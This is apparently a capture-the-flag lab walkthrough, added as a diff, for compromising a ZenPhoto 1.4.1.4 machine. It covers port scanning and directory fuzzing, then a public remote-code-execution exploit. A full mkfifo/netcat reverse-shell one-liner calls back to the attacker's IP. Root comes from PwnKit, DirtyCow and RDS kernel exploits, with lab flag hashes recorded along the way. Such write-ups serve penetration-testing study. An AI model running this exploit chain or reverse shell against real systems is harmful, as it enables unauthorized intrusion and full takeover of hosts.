@@ -1,0 +1,121 @@
+																							    ZenPhoto Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.41
+export IP=192.168.68.41
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp   open  ssh
+23/tcp   open  telnet
+80/tcp   open  http
+3306/tcp open  mysql
+
+3. nmap -Pn -n -sC -sV -p22,23,80,3306 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+23/tcp   open  ipp     CUPS 1.4
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-title: 403 Forbidden
+|_http-server-header: CUPS/1.4
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+
+5353/udp  open   zeroconf
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+ http-enum: 
+|   /test/: Test page
+|_  /icons/: Potentially interesting folder w/ directory listing
+
+nikto --url $IP
+
+Port 23 - CUPS 1.4
+
+searchsploit CUPS
+CUPS < 2.0.3 - Remote Command Execution                                                                                                              | linux/remote/41233.py       < nothing here so far>
+
+Port 80 Enumeration
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/FUZZ -t 500 -mc 200 -fs 1415 -fc 404
+
+/test/
+
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/test/FUZZ"
+ffuf -c -w /usr/share/wordlists/last_resort.txt -u http://$IP/test/FUZZ -t 500 -mc 200 -fs 1415 -fc 404                                                                                                        
+
+albums                                                                                                          
+cache                                                                                            
+index                                                                                                             
+index.php                                                                                            
+plugins
+robots.txt
+robots
+themes
+uploaded     
+
+View page source: http://192.168.68.41/test/
+
+<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (search.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
+
+searchsploit zenphoto
+ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                                    | php/webapps/18083.php
+
+searchsploit -m php/webapps/18083.php
+
+Exploitation
+
+php 18083.php 192.168.68.41 /test/
++-----------------------------------------------------------+
+| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
++-----------------------------------------------------------+
+
+zenphoto-shell# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)                # We got command execution, now let's get the shell
+
+nc -lvnp 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.68 4444 >/tmp/f                #  Got ze shell
+
+cd /home
+cat local.txt                    # Flag: c7cfa94630d5dd78dae2b1884fe639b9
+
+
+Privilege escalation
+
+run linpeas.sh, notice that the system if vulnerable to: Let's try all of them!
+
+Vulnerable to CVE-2021-4034 
+
+Since we don't have python3 installed, we need a version for python.
+
+https://github.com/k1revam/OSCP/blob/main/Kernel%20exploits/Policykit%20-1%20%5BCVE-2021-4034%5D%20(PwnKit)/Python%20exploit
+
+python exploit.py
+#whoami
+root
+cd /root 
+cat /proof.txt       # Flag: a3000003fa36f82844d0e8de39a0eaeb
+
+[CVE-2016-5195] dirtycow 2      
+
+https://www.exploit-db.com/exploits/40839
+
+gcc -pthread exploit.c -o exploit -lcrypt 
+./exploit or ./exploit 1234  
+   
+[CVE-2010-3904] rds
+https://www.exploit-db.com/exploits/15285
+
+
+gcc exploit.c -o 15285 -m32
+chmod +x 15285
+./15285
